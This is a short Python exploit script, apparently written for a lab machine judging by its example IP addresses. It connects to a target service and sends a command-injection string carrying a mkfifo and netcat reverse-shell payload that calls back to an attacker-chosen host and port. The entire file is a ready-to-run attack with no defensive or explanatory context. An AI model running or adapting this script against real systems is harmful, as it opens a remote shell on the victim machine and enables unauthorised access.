#!/bin/env python3

import socket
import sys


def exploit(rhost, rport, lhost, lport):
    payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
    s = socket.socket()
    s.connect((rhost, int(rport)))
    s.recv(1024)
    s.send(f"AB; {payload}\n".encode())
    s.close()


if len(sys.argv) != 5:
    print("Usage: ./2075.py [RHOST] [RPORT] [LHOST] [LPORT]\n")
    print("Example: ./2075.py 10.129.88.31 80 10.10.14.48 9001\n")
    sys.exit(-1)
else:
    exploit(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
